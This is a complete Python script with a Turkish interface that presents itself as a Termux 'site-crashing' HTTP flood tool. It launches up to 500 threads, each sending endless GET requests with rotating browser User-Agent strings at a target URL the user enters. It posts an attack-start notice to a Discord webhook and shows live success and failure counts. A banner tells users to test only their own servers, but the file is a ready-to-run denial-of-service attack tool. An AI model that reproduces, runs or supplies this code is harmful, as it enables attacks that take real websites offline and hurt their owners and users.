import os
import sys
import time
import random
import threading
import requests
from colorama import Fore, init, Style

init(autoreset=True)

WEBHOOK_URL = "WEBHOOK_URLUNUZ"  
MAX_THREADS = 500
HTTP_TIMEOUT = 5
STATS_REFRESH = 2

stats = {
    "success": 0,
    "failed": 0,
    "active_threads": 0
}
stats_lock = threading.Lock()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    print(Fore.RED + r"""
 ▄▀▀█▄▄   ▄▀▀█▄▄   ▄▀▀▀▀▄   ▄▀▀▀▀▄ 
█ ▄▀   █ █ ▄▀   █ █      █ █ █   ▐ 
▐ █    █ ▐ █    █ █      █    ▀▄   
  █    █   █    █ ▀▄    ▄▀ ▀▄   █  
 ▄▀▄▄▄▄▀  ▄▀▄▄▄▄▀   ▀▀▀▀    █▀▀▀   
█     ▐  █     ▐            ▐      
▐        ▐                   
    """)
    print(Fore.CYAN + "      [TERMUX HTTP FLOOD] - Gelişmiş Site Çökertme Aracı")
    print(Fore.YELLOW + "\n      [!] Sadece kendi sunucularınızı test edin!")
    print(Fore.RED + "      [!] Yasa dışı kullanım suçtur!")
    print(Style.RESET_ALL + "="*60)

def send_to_discord(message):
    try:
        data = {"content": message}
        requests.post(WEBHOOK_URL, json=data, timeout=5)
    except:
        pass

def http_flood(target, threads):
    print(Fore.GREEN + f"\n[+] Hedef: {target}")
    print(Fore.YELLOW + f"[+] Thread Sayısı: {threads}")
    print(Fore.CYAN + "[+] BAŞLATILIYOR...\n")
    
    send_to_discord(f"🚀 HTTP SALDIRISI BAŞLADI: {target} | Threads: {threads}")
    
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Linux; Android 10; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
    ]

    def attack():
        with stats_lock:
            stats["active_threads"] += 1
        while True:
            try:
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Accept-Language': 'tr-TR,tr;q=0.9',
                    'Cache-Control': 'no-cache'
                }
                response = requests.get(target, headers=headers, timeout=HTTP_TIMEOUT)
                with stats_lock:
                    stats["success"] += 1
                print(Fore.GREEN + f"[+] Paket Gönderildi: {target} | Durum Kodu: {response.status_code}")
            except Exception as e:
                with stats_lock:
                    stats["failed"] += 1
                print(Fore.RED + f"[-] Hata: {str(e)}")

    for _ in range(min(threads, MAX_THREADS)):
        threading.Thread(target=attack, daemon=True).start()

def stats_monitor():
    while True:
        with stats_lock:
            clear()
            show_banner()
            print(Fore.CYAN + f"\n[GERÇEK ZAMANLI İSTATİSTİKLER]")
            print(Fore.GREEN + f"  Başarılı İstekler: {stats['success']}")
            print(Fore.RED + f"  Başarısız İstekler: {stats['failed']}")
            print(Fore.YELLOW + f"  Aktif Threadler: {stats['active_threads']}")
            print(Fore.CYAN + "\n[!] DURDURMAK İÇIN: CTRL + C")
            print("="*60)
        time.sleep(STATS_REFRESH)

if __name__ == "__main__":
    try:
        clear()
        show_banner()
        
        target = input(Fore.CYAN + "\n[?] Hedef URL (http/https olmadan): ").strip()
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
            
        threads = int(input("[?] Thread Sayısı (1-500): "))
        threads = max(1, min(threads, MAX_THREADS))

        threading.Thread(target=stats_monitor, daemon=True).start()
        http_flood(target, threads)

        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Saldırı durduruldu. Çıkılıyor...")
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"\n[!] Hata: {str(e)}")
        sys.exit(1)
